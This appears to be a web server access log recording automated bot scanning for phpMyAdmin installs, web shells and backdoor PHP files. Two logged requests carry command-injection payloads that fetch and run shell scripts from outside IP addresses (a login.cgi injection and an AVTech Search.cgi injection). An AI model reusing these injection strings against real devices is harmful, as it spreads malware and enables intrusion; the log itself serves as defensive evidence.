[0mGET /admin/phpMyAdmin/index.php [33m404 [0m2.191 ms - 947[0m
[0mGET /admin/phpmyadmin2/index.php [33m404 [0m2.180 ms - 947[0m
[0mGET /mysql-admin/index.php [33m404 [0m2.920 ms - 947[0m
[0mGET /mysql_admin/index.php [33m404 [0m2.251 ms - 947[0m
[0mGET /phpadmin/index.php [33m404 [0m2.063 ms - 947[0m
[0mGET /phpAdmin/index.php [33m404 [0m3.024 ms - 947[0m
[0mGET /phpmyadmin0/index.php [33m404 [0m2.179 ms - 947[0m
[0mGET /phpmyadmin1/index.php [33m404 [0m2.180 ms - 947[0m
[0mGET /phpmyadmin2/index.php [33m404 [0m2.190 ms - 947[0m
[0mGET /phpMyAdmin-4.4.0/index.php [33m404 [0m1.981 ms - 947[0m
[0mGET /myadmin/index.php [33m404 [0m2.122 ms - 947[0m
[0mGET /xampp/phpmyadmin/index.php [33m404 [0m2.315 ms - 947[0m
[0mGET /phpMyadmin_bak/index.php [33m404 [0m2.855 ms - 947[0m
[0mGET /www/phpMyAdmin/index.php [33m404 [0m2.282 ms - 947[0m
[0mGET /tools/phpMyAdmin/index.php [33m404 [0m6.392 ms - 947[0m
[0mGET /phpmyadmin-old/index.php [33m404 [0m3.065 ms - 947[0m
[0mGET /phpMyAdminold/index.php [33m404 [0m2.173 ms - 947[0m
[0mGET /phpMyAdmin.old/index.php [33m404 [0m2.279 ms - 947[0m
[0mGET /pma-old/index.php [33m404 [0m2.978 ms - 947[0m
[0mGET /claroline/phpMyAdmin/index.php [33m404 [0m2.102 ms - 947[0m
[0mGET /typo3/phpmyadmin/index.php [33m404 [0m2.199 ms - 947[0m
[0mGET /phpma/index.php [33m404 [0m2.944 ms - 947[0m
[0mGET /phpmyadmin/phpmyadmin/index.php [33m404 [0m2.019 ms - 947[0m
[0mGET /phpMyAdmin/phpMyAdmin/index.php [33m404 [0m2.304 ms - 947[0m
[0mGET /phpMyAbmin/index.php [33m404 [0m10.887 ms - 947[0m
[0mGET /phpMyAdmin__/index.php [33m404 [0m6.972 ms - 947[0m
[0mGET /phpMyAdmin+++---/index.php [33m404 [0m2.120 ms - 947[0m
[0mGET /v/index.php [33m404 [0m2.294 ms - 947[0m
[0mGET /phpmyadm1n/index.php [33m404 [0m2.203 ms - 947[0m
[0mGET /phpMyAdm1n/index.php [33m404 [0m2.213 ms - 947[0m
[0mGET /shaAdmin/index.php [33m404 [0m2.577 ms - 947[0m
[0mGET /phpMyadmi/index.php [33m404 [0m2.746 ms - 947[0m
[0mGET /phpMyAdmion/index.php [33m404 [0m2.140 ms - 947[0m
[0mGET /MyAdmin/index.php [33m404 [0m2.117 ms - 947[0m
[0mGET /phpMyAdmin1/index.php [33m404 [0m3.020 ms - 947[0m
[0mGET /phpMyAdmin123/index.php [33m404 [0m2.327 ms - 947[0m
[0mGET / [32m200 [0m1.818 ms - 4244[0m
[0mGET / [32m200 [0m1.041 ms - 4244[0m
[0mGET / [32m200 [0m0.950 ms - 4244[0m
[0mGET / [32m200 [0m0.892 ms - 4244[0m
[0mGET /login.cgi?cli=aa%20aa%27;wget%20http://185.244.25.131/bins.sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ [33m404 [0m3.580 ms - 947[0m
[0mGET / [32m200 [0m1.065 ms - 4244[0m
[0mGET / [32m200 [0m0.952 ms - 4244[0m
[0mGET / [32m200 [0m0.778 ms - 4244[0m
[0mGET /admin/assets/js/views/login.js [33m404 [0m2.556 ms - 947[0m
[0mGET / [32m200 [0m1.075 ms - 4244[0m
[0mGET / [32m200 [0m0.856 ms - 4244[0m
[0mGET / [32m200 [0m0.965 ms - 4244[0m
[0mGET /cgi-bin/nobody/Search.cgi?action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%20;XmlAp%20r%20Account.User1.Password%3E$(cd%20/tmp;%20wget%20http://209.141.33.119/avtechsh%20-O%20d4rk;%20chmod%20777%20d4rk;%20sh%20d4rk)&password=admin [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m1.012 ms - 4244[0m
[0mGET / [32m200 [0m0.936 ms - 4244[0m
[0mGET / [32m200 [0m0.922 ms - 4244[0m
[0mGET / [32m200 [0m1.016 ms - 4244[0m
[0mGET / [32m200 [0m0.682 ms - 4244[0m
[0mGET / [32m200 [0m0.859 ms - 4244[0m
[0mPROPFIND / [33m404 [0m2.627 ms - 998[0m
[0mGET /webdav/ [33m404 [0m2.180 ms - 947[0m
[0mGET /help.php [33m404 [0m2.386 ms - 947[0m
[0mGET /java.php [33m404 [0m2.411 ms - 947[0m
[0mGET /test.php [33m404 [0m2.388 ms - 947[0m
[0mGET /db_cts.php [33m404 [0m2.937 ms - 947[0m
[0mGET /db_pma.php [33m404 [0m2.455 ms - 947[0m
[0mGET /logon.php [33m404 [0m2.545 ms - 947[0m
[0mGET /help-e.php [33m404 [0m3.110 ms - 947[0m
[0mGET /license.php [33m404 [0m2.224 ms - 947[0m
[0mGET /log.php [33m404 [0m2.430 ms - 947[0m
[0mGET /hell.php [33m404 [0m2.916 ms - 947[0m
[0mGET /pmd_online.php [33m404 [0m2.356 ms - 947[0m
[0mGET /x.php [33m404 [0m2.197 ms - 947[0m
[0mGET /shell.php [33m404 [0m3.020 ms - 947[0m
[0mGET /htdocs.php [33m404 [0m2.240 ms - 947[0m
[0mGET /desktop.ini.php [33m404 [0m2.314 ms - 947[0m
[0mGET /z.php [33m404 [0m2.357 ms - 947[0m
[0mGET /lala.php [33m404 [0m2.453 ms - 947[0m
[0mGET /lala-dpr.php [33m404 [0m2.422 ms - 947[0m
[0mGET /wpo.php [33m404 [0m2.673 ms - 947[0m
[0mGET /text.php [33m404 [0m2.841 ms - 947[0m
[0mGET /wp-config.php [33m404 [0m9.739 ms - 947[0m
[0mGET /muhstik.php [33m404 [0m2.277 ms - 947[0m
[0mGET /muhstik2.php [33m404 [0m3.361 ms - 947[0m
[0mGET /muhstiks.php [33m404 [0m2.612 ms - 947[0m
[0mGET /muhstik-dpr.php [33m404 [0m2.428 ms - 947[0m
[0mGET /lol.php [33m404 [0m3.049 ms - 947[0m
[0mGET /uploader.php [33m404 [0m2.400 ms - 947[0m
[0mGET /cmd.php [33m404 [0m2.348 ms - 947[0m
[0mGET /cmx.php [33m404 [0m3.060 ms - 947[0m
[0mGET /cmv.php [33m404 [0m2.326 ms - 947[0m
[0mGET /knal.php [33m404 [0m2.300 ms - 947[0m
[0mGET /cmd.php [33m404 [0m2.514 ms - 947[0m
[0mGET /shell.php [33m404 [0m2.228 ms - 947[0m
[0mGET /appserv.php [33m404 [0m2.261 ms - 947[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m2.666 ms - 947[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m3.123 ms - 947[0m
[0mGET /phpmyadmin/scripts/db___.init.php [33m404 [0m2.478 ms - 947[0m
[0mGET /phpMyAdmin/scripts/db___.init.php [33m404 [0m2.312 ms - 947[0m
[0mGET /cacti/plugins/weathermap/editor.php [33m404 [0m3.225 ms - 947[0m
[0mPOST /wuwu11.php [33m404 [0m2.334 ms - 998[0m
[0mPOST /xw.php [33m404 [0m9.005 ms - 998[0m
[0mPOST /xw1.php [33m404 [0m3.104 ms - 998[0m
[0mPOST /wc.php [33m404 [0m2.328 ms - 998[0m
[0mPOST /xx.php [33m404 [0m2.398 ms - 998[0m
[0mPOST /s.php [33m404 [0m2.453 ms - 998[0m
[0mPOST /w.php [33m404 [0m2.163 ms - 998[0m
[0mPOST /sheep.php [33m404 [0m2.456 ms - 998[0m
[0mPOST /qaq.php [33m404 [0m2.342 ms - 998[0m
[0mPOST /db.init.php [33m404 [0m3.018 ms - 998[0m
[0mPOST /db_session.init.php [33m404 [0m2.480 ms - 998[0m
[0mPOST /db__.init.php [33m404 [0m2.534 ms - 998[0m
[0mPOST /m.php?pbid=open [33m404 [0m2.886 ms - 998[0m
[0mPOST /db_dataml.php [33m404 [0m2.760 ms - 998[0m
[0mPOST /db_desql.php [33m404 [0m2.259 ms - 998[0m
[0mPOST /mx.php [33m404 [0m2.632 ms - 998[0m
[0mPOST /wshell.php [33m404 [0m2.318 ms - 998[0m
[0mPOST /xshell.php [33m404 [0m2.256 ms - 998[0m
[0mPOST /qq.php [33m404 [0m2.271 ms - 998[0m
[0mPOST /conflg.php [33m404 [0m3.197 ms - 998[0m
[0mPOST /lindex.php [33m404 [0m2.289 ms - 998[0m
[0mPOST /phpStudy.php [33m404 [0m2.397 ms - 998[0m
[0mPOST /weixiao.php [33m404 [0m3.088 ms - 998[0m
[0mPOST /feixiang.php [33m404 [0m2.131 ms - 998[0m
[0mPOST /ak47.php [33m404 [0m2.246 ms - 998[0m
[0mPOST /ak48.php [33m404 [0m2.130 ms - 998[0m
[0mPOST /xiao.php [33m404 [0m2.121 ms - 998[0m
[0mPOST /yao.php [33m404 [0m2.261 ms - 998[0m
[0mPOST /defect.php [33m404 [0m2.295 ms - 998[0m
[0mPOST /webslee.php [33m404 [0m3.134 ms - 998[0m
[0mPOST /q.php [33m404 [0m2.335 ms - 998[0m
[0mPOST /hm.php [33m404 [0m2.448 ms - 998[0m
[0mPOST /cainiao.php [33m404 [0m3.034 ms - 998[0m
[0mPOST /zuoshou.php [33m404 [0m2.399 ms - 998[0m
[0mPOST /zuo.php [33m404 [0m2.453 ms - 998[0m
[0mPOST /aotu.php [33m404 [0m2.418 ms - 998[0m
[0mPOST /bak.php [33m404 [0m3.061 ms - 998[0m
[0mPOST /system.php [33m404 [0m2.420 ms - 998[0m
[0mPOST /l6.php [33m404 [0m3.491 ms - 998[0m
[0mPOST /l7.php [33m404 [0m3.211 ms - 998[0m
[0mPOST /l8.php [33m404 [0m2.231 ms - 998[0m
[0mPOST /q.php [33m404 [0m2.331 ms - 998[0m
[0mPOST /56.php [33m404 [0m3.095 ms - 998[0m
[0mPOST /mz.php [33m404 [0m2.441 ms - 998[0m
[0mPOST /xx.php [33m404 [0m2.181 ms - 998[0m
[0mPOST /yumo.php [33m404 [0m2.278 ms - 998[0m
[0mPOST /min.php [33m404 [0m2.825 ms - 998[0m
[0mPOST /wan.php [33m404 [0m2.349 ms - 998[0m
[0mPOST /wanan.php [33m404 [0m6.895 ms - 998[0m
[0mPOST /ssaa.php [33m404 [0m2.937 ms - 998[0m
[0mPOST /qq.php [33m404 [0m2.375 ms - 998[0m
[0mPOST /aw.php [33m404 [0m2.161 ms - 998[0m
[0mPOST /12.php [33m404 [0m3.326 ms - 998[0m
[0mPOST /hh.php [33m404 [0m2.184 ms - 998[0m
[0mPOST /ak.php [33m404 [0m2.322 ms - 998[0m
[0mPOST /ip.php [33m404 [0m3.055 ms - 998[0m
[0mPOST /infoo.php [33m404 [0m2.335 ms - 998[0m
[0mPOST /qq.php [33m404 [0m2.535 ms - 998[0m
[0mPOST /qwe.php [33m404 [0m6.968 ms - 998[0m
[0mPOST /1213.php [33m404 [0m2.787 ms - 998[0m
[0mPOST /post.php [33m404 [0m2.229 ms - 998[0m
[0mPOST /h1.php [33m404 [0m2.209 ms - 998[0m
[0mPOST /test.php [33m404 [0m2.834 ms - 998[0m
[0mPOST /3.php [33m404 [0m2.262 ms - 998[0m
[0mPOST /phpinfi.php [33m404 [0m2.204 ms - 998[0m
[0mPOST /aaaa.php [33m404 [0m2.321 ms - 998[0m
[0mPOST /9510.php [33m404 [0m2.178 ms - 998[0m
[0mPOST /python.php [33m404 [0m2.382 ms - 998[0m
[0mPOST /default.php [33m404 [0m2.281 ms - 998[0m
[0mPOST /sean.php [33m404 [0m3.232 ms - 998[0m
[0mPOST /app.php [33m404 [0m2.316 ms - 998[0m
[0mPOST /tiandi.php [33m404 [0m2.285 ms - 998[0m
[0mPOST /miao.php [33m404 [0m2.857 ms - 998[0m
[0mPOST /xz.php [33m404 [0m2.314 ms - 998[0m
[0mPOST /linuxse.php [33m404 [0m2.236 ms - 998[0m
[0mPOST /zuoindex.php [33m404 [0m2.219 ms - 998[0m
[0mPOST /zshmindex.php [33m404 [0m2.139 ms - 998[0m
[0mPOST /tomcat.php [33m404 [0m2.122 ms - 998[0m
[0mPOST /ceshi.php [33m404 [0m2.402 ms - 998[0m
[0mPOST /1hou.php [33m404 [0m3.024 ms - 998[0m
[0mPOST /ou2.php [33m404 [0m2.165 ms - 998[0m
[0mPOST /zuos.php [33m404 [0m2.153 ms - 998[0m
[0mPOST /zuoss.php [33m404 [0m3.034 ms - 998[0m
[0mPOST /zuoshss.php [33m404 [0m2.363 ms - 998[0m
[0mPOST /boots.php [33m404 [0m2.186 ms - 998[0m
[0mPOST /s.php [33m404 [0m2.248 ms - 998[0m
[0mPOST /qw.php [33m404 [0m2.747 ms - 998[0m
[0mPOST /test.php [33m404 [0m2.797 ms - 998[0m
[0mPOST /caonma.php [33m404 [0m2.331 ms - 998[0m
[0mPOST /ss.php [33m404 [0m3.231 ms - 998[0m
[0mPOST /wcp.php [33m404 [0m4.946 ms - 998[0m
[0mPOST /u.php [33m404 [0m2.312 ms - 998[0m
[0mPOST /uuu.php [33m404 [0m2.749 ms - 998[0m
[0mPOST /sss.php [33m404 [0m2.291 ms - 998[0m
[0mPOST /1.php [33m404 [0m2.120 ms - 998[0m
[0mPOST /2.php [33m404 [0m2.275 ms - 998[0m
[0mPOST /core.php [33m404 [0m2.781 ms - 998[0m
[0mPOST /qaz.php [33m404 [0m2.140 ms - 998[0m
[0mPOST /sha.php [33m404 [0m2.379 ms - 998[0m
[0mPOST /ppx.php [33m404 [0m3.301 ms - 998[0m
[0mPOST /1.php [33m404 [0m2.250 ms - 998[0m
[0mPOST /confg.php [33m404 [0m2.211 ms - 998[0m
[0mPOST /conf1g.php [33m404 [0m3.095 ms - 998[0m
[0mPOST /confg.php [33m404 [0m5.490 ms - 998[0m
[0mPOST /confg.php [33m404 [0m2.260 ms - 998[0m
[0mPOST /ver.php [33m404 [0m2.230 ms - 998[0m
[0mPOST /hack.php [33m404 [0m2.816 ms - 998[0m
[0mPOST /qa.php [33m404 [0m2.303 ms - 998[0m
[0mPOST /Ss.php [33m404 [0m2.287 ms - 998[0m
[0mPOST /xxx.php [33m404 [0m2.864 ms - 998[0m
[0mPOST /92.php [33m404 [0m2.259 ms - 998[0m
[0mPOST /z.php [33m404 [0m2.325 ms - 998[0m
[0mPOST /x.php [33m404 [0m2.926 ms - 998[0m
[0mPOST /dexgp.php [33m404 [0m2.780 ms - 998[0m
[0mPOST /nuoxi.php [33m404 [0m2.295 ms - 998[0m
[0mPOST /godkey.php [33m404 [0m2.184 ms - 998[0m
[0mPOST /okokok.php [33m404 [0m2.350 ms - 998[0m
[0mPOST /erwa.php [33m404 [0m2.167 ms - 998[0m
[0mPOST /pma.php [33m404 [0m2.202 ms - 998[0m
[0mPOST /ruyi.php [33m404 [0m8.691 ms - 998[0m
[0mPOST /51314.php [33m404 [0m2.247 ms - 998[0m
[0mPOST /5201314.php [33m404 [0m2.191 ms - 998[0m
[0mPOST /fusheng.php [33m404 [0m2.923 ms - 998[0m
[0mPOST /general.php [33m404 [0m2.370 ms - 998[0m
[0mPOST /repeat.php [33m404 [0m2.100 ms - 998[0m
[0mPOST /ldw.php [33m404 [0m2.252 ms - 998[0m
[0mPOST /api.php [33m404 [0m2.412 ms - 998[0m
[0mPOST /s1.php [33m404 [0m2.237 ms - 998[0m
[0mPOST /xiaodai.php [33m404 [0m2.262 ms - 998[0m
[0mPOST /hello.php [33m404 [0m2.965 ms - 998[0m
[0mPOST /xp.php [33m404 [0m6.986 ms - 998[0m
[0mPOST /1.php [33m404 [0m2.135 ms - 998[0m
[0mPOST /2.php [33m404 [0m3.011 ms - 998[0m
[0mPOST /p.php [33m404 [0m2.294 ms - 998[0m
[0mPOST /a.php [33m404 [0m2.291 ms - 998[0m
[0mPOST /m.php [33m404 [0m2.287 ms - 998[0m
[0mPOST /conf.php [33m404 [0m2.234 ms - 998[0m
[0mGET /index.php [33m404 [0m2.408 ms - 947[0m
[0mGET /phpmyadmin/index.php [33m404 [0m2.247 ms - 947[0m
[0mGET /phpMyAdmin/index.php [33m404 [0m10.742 ms - 947[0m
[0mGET /pma/index.php [33m404 [0m2.219 ms - 947[0m
[0mGET /PMA/index.php [33m404 [0m2.428 ms - 947[0m
[0mGET /PMA2/index.php [33m404 [0m3.909 ms - 947[0m
[0mGET /pmamy2/index.php [33m404 [0m2.535 ms - 947[0m
[0mGET /mysql/index.php [33m404 [0m2.693 ms - 947[0m
[0mGET /admin/index.php [33m404 [0m3.092 ms - 947[0m
[0mGET /dbadmin/index.php [33m404 [0m2.510 ms - 947[0m
[0mGET /web/phpMyAdmin/index.php [33m404 [0m2.630 ms - 947[0m
[0mGET /admin/pma/index.php [33m404 [0m3.505 ms - 947[0m
[0mGET /admin/mysql/index.php [33m404 [0m2.636 ms - 947[0m
[0mGET /admin/mysql2/index.php [33m404 [0m2.401 ms - 947[0m
[0mGET /admin/phpmyadmin/index.php [33m404 [0m3.198 ms - 947[0m
[0mGET /admin/phpmyadmin2/index.php [33m404 [0m2.504 ms - 947[0m
[0mGET /mysqladmin/index.php [33m404 [0m2.449 ms - 947[0m
[0mGET /mysql-admin/index.php [33m404 [0m2.269 ms - 947[0m
[0mGET /mysql_admin/index.php [33m404 [0m2.945 ms - 947[0m
[0mGET /phpadmin/index.php [33m404 [0m2.373 ms - 947[0m
[0mGET /phpAdmin/index.php [33m404 [0m2.270 ms - 947[0m
[0mGET /phpmyadmin0/index.php [33m404 [0m3.300 ms - 947[0m
[0mGET /phpmyadmin2/index.php [33m404 [0m2.439 ms - 947[0m
[0mGET /phpMyAdmin-4.4.0/index.php [33m404 [0m2.284 ms - 947[0m
[0mGET /myadmin/index.php [33m404 [0m3.311 ms - 947[0m
[0mGET /myadmin2/index.php [33m404 [0m2.343 ms - 947[0m
[0mGET /xampp/phpmyadmin/index.php [33m404 [0m2.449 ms - 947[0m
[0mGET /phpMyadmin_bak/index.php [33m404 [0m3.234 ms - 947[0m
[0mGET /www/phpMyAdmin/index.php [33m404 [0m2.286 ms - 947[0m
[0mGET /tools/phpMyAdmin/index.php [33m404 [0m2.194 ms - 947[0m
[0mGET /phpmyadmin-old/index.php [33m404 [0m2.918 ms - 947[0m
[0mGET /phpMyAdminold/index.php [33m404 [0m2.276 ms - 947[0m
[0mGET /phpMyAdmin.old/index.php [33m404 [0m2.540 ms - 947[0m
[0mGET /pma-old/index.php [33m404 [0m2.205 ms - 947[0m
[0mGET /claroline/phpMyAdmin/index.php [33m404 [0m3.008 ms - 947[0m
[0mGET /typo3/phpmyadmin/index.php [33m404 [0m2.379 ms - 947[0m
[0mGET /phpma/index.php [33m404 [0m2.465 ms - 947[0m
[0mGET /phpmyadmin/phpmyadmin/index.php [33m404 [0m5.708 ms - 947[0m
[0mGET /phpMyAdmin/phpMyAdmin/index.php [33m404 [0m2.171 ms - 947[0m
[0mGET /phpMyAbmin/index.php [33m404 [0m4.470 ms - 947[0m
[0mGET /phpMyAdmin__/index.php [33m404 [0m3.014 ms - 947[0m
[0mGET /phpMyAdmin+++---/index.php [33m404 [0m7.340 ms - 947[0m
[0mGET /v/index.php [33m404 [0m2.415 ms - 947[0m
[0mGET /phpmyadm1n/index.php [33m404 [0m2.999 ms - 947[0m
[0mGET /phpMyAdm1n/index.php [33m404 [0m2.349 ms - 947[0m
[0mGET /shaAdmin/index.php [33m404 [0m2.308 ms - 947[0m
[0mGET /phpMyadmi/index.php [33m404 [0m2.940 ms - 947[0m
[0mGET /phpMyAdmion/index.php [33m404 [0m2.262 ms - 947[0m
[0mGET /MyAdmin/index.php [33m404 [0m2.269 ms - 947[0m
[0mGET /phpMyAdmin1/index.php [33m404 [0m2.406 ms - 947[0m
[0mGET / [32m200 [0m0.882 ms - 4244[0m
[0mGET /stylesheets/style.css [32m200 [0m1.100 ms - 1030[0m
[0mGET /stylesheets/table.css [32m200 [0m1.021 ms - 1180[0m
[0mGET /script.js [33m404 [0m2.469 ms - 947[0m
[0mGET /addproject.html [32m200 [0m0.900 ms - 3070[0m
[0mGET /stylesheets/style.css [36m304 [0m0.409 ms - -[0m
[0mGET /script.js [33m404 [0m2.852 ms - 947[0m
[0mGET /index.html [32m200 [0m0.759 ms - 4244[0m
[0mGET /stylesheets/table.css [36m304 [0m0.692 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.797 ms - -[0m
[0mGET /script.js [33m404 [0m4.408 ms - 947[0m
[0mGET /addproject.html [36m304 [0m0.704 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.362 ms - -[0m
[0mGET /script.js [33m404 [0m2.808 ms - 947[0m
[0mGET /index.html [36m304 [0m0.681 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.521 ms - -[0m
[0mGET /stylesheets/table.css [36m304 [0m0.511 ms - -[0m
[0mGET /script.js [33m404 [0m5.054 ms - 947[0m
